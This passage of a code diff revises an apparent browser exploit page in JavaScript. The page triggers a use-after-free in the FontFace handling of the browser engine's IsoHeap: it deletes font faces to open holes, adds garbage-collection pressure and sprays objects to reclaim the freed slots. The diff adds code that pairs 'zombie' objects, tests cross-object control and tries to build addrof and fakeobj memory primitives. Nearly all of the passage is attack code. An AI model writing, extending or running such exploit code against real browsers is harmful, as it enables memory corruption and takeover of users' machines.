         sheet.deleteRule(1);
         forceStyle();
-        
-        // 3. Delete flush rules for allocation churn
         deleteFlushRules();
-        
-        // 4. Delete more hole faces to widen the gap
+
+        // Extra holes
         for (let i = 0; i < holeFaces.length; i += 4) {
           try { document.fonts.delete(holeFaces[i]); } catch(e) {}
         }
         forceStyle();
-        log("Extra holes punched");
-        
-        // 5. GC pressure
+
+        // GC
         for (let i = 0; i < 8; i++) {
           const tmp = [];
           for (let j = 0; j < 256; j++) tmp.push(new ArrayBuffer(8192));
         }
-        log("GC pressure applied post-free");
-        
-        // 6. RECLAIM: Spray FontFace objects into the freed slot
+
+        // Reclaim
         reclaimSpray();
-        
-        // 7. Force style recalc with the potentially-confused font
         forceStyle();
-        
-        // 8. Trigger layout with the victim font
+
+        // Layout test
         const testDiv = document.createElement("div");
         testDiv.textContent = "AB";
         testDiv.style.cssText = "position:absolute;left:-9999px;font:64px trigger;";
         document.body.appendChild(testDiv);
         void testDiv.offsetWidth;
-        
-        log("UAF window closed, reclamation complete");
+
+        log("UAF window closed");
       }
       return undefined;
     }
   });
-  
+
   // RAF fallback
   let rafCount = 0;
   const rafLoop = () => {
     rafCount++;
     if (!fired && rafCount >= 5) {
-      log("RAF fallback trigger");
+      log("RAF fallback");
       try {
         killFontFaceSetCache();
         const sheet = document.getElementById("s").sheet;
@@ -587,111 +838,79 @@ window.onload = () => {
           reclaimSpray();
           forceStyle();
         }
-      } catch(e) {
-        log("RAF error: " + e.message);
-      }
+      } catch(e) { log("RAF err: " + e.message); }
     }
     if (rafCount < 20) requestAnimationFrame(rafLoop);
   };
   requestAnimationFrame(rafLoop);
-  
-  showMessage("Stage 4/6:\nFiring trigger...", false);
-  
-  // PHASE 4: Fire the font load to trigger the promise
+
+  showMessage("Stage 4/8:\nFiring trigger...", false);
+
   document.fonts.load("1em trigger, x", "AB").then(faces => {
     log("Font load resolved: " + faces.length + " faces");
     keepAlive.push(faces);
-    
-    showMessage("Stage 5/6:\nRunning confusion oracle...", false);
-    
-    // PHASE 5: Multiple delayed oracle scans
-    const scanDelays = [300, 800, 1500, 3000, 5000];
-    let scanIdx = 0;
-    let foundConfusion = false;
-    
-    function runOracle() {
-      if (scanIdx >= scanDelays.length) {
-        // All scans exhausted
-        if (!foundConfusion) {
-          log("All oracle scans negative. Trying crash oracle...");
-          const crashed = attemptCrashOracle();
-          if (crashed) {
-            showMessage(
-              "PARTIAL ✅\n" +
-              "Dangling pointer detected via\n" +
-              "crash oracle (exception on\n" +
-              "deleted face access).\n" +
-              "Type confusion not yet achieved.\n" +
-              "Need tighter reclaim timing.",
-              true
-            );
-          } else {
-            showMessage(
-              "PARTIAL ✅\n" +
-              "UAF window confirmed but no\n" +
-              "type confusion detected.\n" +
-              "The IsoHeap reclamation may need\n" +
-              "different FontFace variants.\n" +
-              "See log for details.",
-              true
-            );
-          }
-        }
+
+    // Wait for spray to settle
+    setTimeout(() => {
+      showMessage("Stage 5/8:\nIdentifying zombies...", false);
+      const pairs = identifyZombies();
+
+      if (pairs.length === 0) {
+        showMessage("PARTIAL ✅\nUAF fired but no pairs found.\nTry more reclaim faces.", true);
         return;
       }
-      
-      const delay = scanDelays[scanIdx++];
-      log("Oracle scan " + scanIdx + "/" + scanDelays.length + " (+" + delay + "ms)");
-      
-      setTimeout(() => {
-        const anomalies = checkTypeConfusion();
-        
-        if (anomalies.length > 0) {
-          foundConfusion = true;
-          log("★ TYPE CONFUSION CONFIRMED ★ " + anomalies.length + " anomalies!");
-          
-          for (const a of anomalies) {
-            log("  → " + a.type + ": " + JSON.stringify(a).substring(0, 120));
-          }
-          
-          // Classify the type confusion
-          const hasPropertyMismatch = anomalies.some(a => a.type === "PROPERTY_MISMATCH");
-          const hasVictimConfused = anomalies.some(a => a.type === "VICTIM_CONFUSED");
-          const hasCanvasOracle = anomalies.some(a => a.type === "CANVAS_CONFUSION");
-          const hasDOMOracle = anomalies.some(a => a.type === "DOM_RENDER_CONFUSION");
-          
-          let detail = anomalies.length + " anomalies detected.\n";
-          if (hasVictimConfused) detail += "Victim face C++ replaced!\n";
-          if (hasPropertyMismatch) detail += "Property mismatch found!\n";
-          if (hasCanvasOracle) detail += "Canvas rendering confused!\n";
-          if (hasDOMOracle) detail += "DOM rendering confused!\n";
-          
-          showMessage("SUCCESS ✅\n" + detail + "Primitives ready for development.", true);
-        } else {
-          log("Oracle scan " + scanIdx + " clean");
-          runOracle(); // Try next delay
-        }
-      }, delay);
-    }
-    
-    runOracle();
-    
+
+      showMessage("Stage 6/8:\nTesting cross-object control...", false);
+      const bestPair = pairs[0];
+      log("Using pair: zombie=hole_" + bestPair.zombieIdx +
+          " ↔ RECLAIM_" + bestPair.reclaimIdx +
+          " (via " + bestPair.method + ")");
+
+      const ctrlResults = testCrossObjectControl(bestPair);
+      log("Cross-obj results: " + JSON.stringify(ctrlResults));
+
+      showMessage("Stage 7/8:\nAttempting address leak...", false);
+
+      // Setup helpers
+      setupWASM();
+      setupSAB();
+      setupControlledBufferFace();
+
+      // Try to build addrof
+      const addrofOk = constructAddrof(bestPair);
+      const fakeobjOk = constructFakeobj(bestPair);
+
+      showMessage("Stage 8/8:\nFinal analysis...", false);
+
+      // Summary
+      let summary = "";
+      summary += "Zombies: " + zombieFaces.length + "\n";
+      summary += "Pairs: " + confusedPairs.length + "\n";
+      summary += "Cross-ctrl: " + (ctrlResults.familyMatch ? "✅" : "❌") + "\n";
+      summary += "addrof: " + (addrofOk ? "✅ BUILT" : "⏳ PENDING") + "\n";
+      summary += "fakeobj: " + (fakeobjOk ? "✅ BUILT" : "⏳ PENDING") + "\n";
+
+      if (addrofOk) {
+        summary += "\n★ MEMORY ACCESS ACHIEVED ★";
+        showMessage("SUCCESS ✅\n" + summary, true);
+      } else {
+        summary += "\nType confusion confirmed.\n";
+        summary += "Need address leak to build\n";
+        summary += "primitives. Check log for\n";
+        summary += "leak technique results.";
+        showMessage("PARTIAL ✅\n" + summary, true);
+      }
+
+    }, 2000);
+
   }, err => {
     log("Font load rejected: " + err);
-    
-    // Even rejection might mean something interesting
-    log("Checking for confusion despite rejection...");
     setTimeout(() => {
-      const anomalies = checkTypeConfusion();
-      if (anomalies.length > 0) {
-        showMessage(
-          "SUCCESS ✅ (via rejection path)\n" +
-          anomalies.length + " anomalies found!\n" +
-          "Type confusion confirmed.",
-          true
-        );
+      const pairs = identifyZombies();
+      if (pairs.length > 0) {
+        showMessage("PARTIAL ✅ (rejection path)\nPairs found: " + pairs.length, true);
       } else {
-        showMessage("FAILED ❌\nFont load error:\n" + err, false);
+        showMessage("FAILED ❌\n" + err, false);
       }
     }, 1000);
   });
